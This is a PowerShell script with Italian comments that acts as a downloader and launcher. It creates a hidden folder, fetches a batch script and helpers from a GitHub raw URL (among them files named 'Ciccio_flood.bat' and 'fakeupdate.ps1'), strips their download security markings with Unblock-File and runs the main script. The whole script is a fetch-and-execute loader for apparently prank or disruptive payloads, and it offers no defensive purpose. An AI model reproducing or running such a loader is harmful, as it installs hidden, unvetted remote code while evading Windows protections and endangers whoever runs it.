$folder = "C:\OmegaFiles"
New-Item -ItemType Directory -Path $folder -Force | Out-Null

# Nascondi la cartella (opzionale)
attrib +h $folder

Write-Host "Scaricamento file in corso..." -ForegroundColor Yellow

# ===== SCARICA LO SCRIPT PRINCIPALE =====
$mainUrl = 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/OMEGAScript.bat'
$mainFile = "$folder\OMEGAScript.bat"

Invoke-WebRequest -Uri $mainUrl -OutFile $mainFile
Unblock-File $mainFile
Write-Host "✅ OMEGAScript.bat" -ForegroundColor Green

# ===== SCARICA GLI HELPER (file batch) =====
$helpers = @(
    @{Url='https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/Ciccio_flood.bat'; Name='Ciccio_flood.bat'},
    @{Url='https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/folder.bat'; Name='folder.bat'}
)

foreach ($h in $helpers) {
    $output = "$folder\$($h.Name)"
    Invoke-WebRequest -Uri $h.Url -OutFile $output
    Unblock-File $output
    Write-Host "✅ $($h.Name)" -ForegroundColor Green
}

# ===== SCARICA LO SCRIPT POWERSHELL (fake update) =====
$psUrl = 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/fakeupdate.ps1'
$psFile = "$folder\fakeupdate.ps1"

Invoke-WebRequest -Uri $psUrl -OutFile $psFile
Unblock-File $psFile
Write-Host "✅ fakeupdate.ps1" -ForegroundColor Green

# ===== SBLOCCO DI SICUREZZA AGGIUNTIVO =====
# Sblocca TUTTI i file .bat e .ps1 nella cartella (doppia sicurezza)
Get-ChildItem "$folder\*.bat", "$folder\*.ps1" | Unblock-File

Write-Host "`nTutti i file sono stati scaricati e sbloccati!" -ForegroundColor Cyan
Write-Host "Avvio OMEGAScript.bat..." -ForegroundColor Yellow

# ===== ESEGUI LO SCRIPT PRINCIPALE =====
Start-Process $mainFile -WindowStyle Normal
